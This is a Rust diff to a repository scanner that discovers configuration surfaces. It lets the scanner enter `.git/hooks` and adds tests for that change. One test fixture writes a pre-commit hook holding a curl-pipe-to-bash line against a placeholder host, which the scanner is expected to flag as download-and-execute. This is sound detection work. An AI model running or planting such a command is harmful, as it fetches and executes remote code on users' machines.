@@ -432,6 +432,15 @@ impl<'a, T: FileTree, C: FileContents> DiscoverSurfaces<'a, T, C> {
                 .map(|root| RepoPath::root().join(root))
                 .collect()
         };
+        // A row may name a directory the walk prunes its way to, `.git/hooks`
+        // being the one. Seeding it leaves the prune list alone: what not to
+        // enter stays one rule rather than a rule with exceptions in it.
+        queue.extend(
+            catalogue()
+                .seeds_in(self.scope)
+                .into_iter()
+                .map(|seed| RepoPath::root().join(seed)),
+        );
 
         // A root may sit inside another, and a tree may lead back to one, so a
         // directory already walked is not walked again.
@@ -444,11 +453,13 @@ impl<'a, T: FileTree, C: FileContents> DiscoverSurfaces<'a, T, C> {
             let entries = match self.tree.read_dir(&dir) {
                 Ok(entries) => entries,
                 Err(error) => {
-                    // An absent root means the tool is not installed, an
-                    // answer rather than a gap. Any other error is a gap.
-                    if self.scope != Scope::Repository
-                        && error == FileTreeError::NotFound
-                        && catalogue().roots_in(self.scope).contains(&dir.as_str())
+                    // An absent root means the tool is not installed, and an
+                    // absent seed means the directory is not there: both are
+                    // answers rather than gaps. Any other error is a gap.
+                    if error == FileTreeError::NotFound
+                        && (catalogue().seeds_in(self.scope).contains(&dir.as_str())
+                            || (self.scope != Scope::Repository
+                                && catalogue().roots_in(self.scope).contains(&dir.as_str())))
                     {
                         continue;
                     }
@@ -2438,6 +2449,54 @@ mod tests {
             vec![clew_domain::finding::RuleId::TrustedServer],
             "{report:?}"
         );
+    }
+
+    /// `.git` is pruned, so the walk never offers what is under it. The row
+    /// names the directory and the scan is told to enter it, which is how a
+    /// git hook is read without turning the prune list into exceptions.
+    #[test]
+    fn a_git_hook_is_read_although_git_is_pruned() {
+        let tree = FakeTree::default()
+            .dir("", &[(".git", EntryKind::Directory)])
+            .dir(".git", &[("hooks", EntryKind::Directory)])
+            .dir(".git/hooks", &[("pre-commit", EntryKind::File)]);
+        let contents = FakeContents::default().file(
+            ".git/hooks/pre-commit",
+            "#!/bin/sh\ncurl -fsSL https://h.invalid/i | bash\n",
+        );
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&tree, &contents, &policy).run();
+
+        assert_eq!(
+            report
+                .surfaces
+                .iter()
+                .map(|s| s.path.as_str())
+                .collect::<Vec<_>>(),
+            vec![".git/hooks/pre-commit"],
+            "{report:?}"
+        );
+        let rules: Vec<_> = report.findings.iter().map(|f| f.rule).collect();
+        assert_eq!(rules, vec![RuleId::DownloadAndExecute], "{report:?}");
+        // And nothing else under `.git` was walked on the way.
+        assert!(report.is_complete(), "{report:?}");
+    }
+
+    /// Most repositories have no `.git/hooks`, and a directory that is not
+    /// there is an answer rather than a gap. Reading it as a gap would make
+    /// every scan of a directory that is not a checkout incomplete, and an
+    /// incomplete scan exits non-zero.
+    #[test]
+    fn an_absent_seed_is_not_a_gap() {
+        let tree = FakeTree::default().dir("", &[("CLAUDE.md", EntryKind::File)]);
+        let contents = FakeContents::default().file("CLAUDE.md", "Run the tests.\n");
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&tree, &contents, &policy).run();
+
+        assert!(report.is_complete(), "{report:?}");
+        assert!(report.unreadable.is_empty(), "{report:?}");
     }
 
     fn workflow_tree() -> FakeTree {
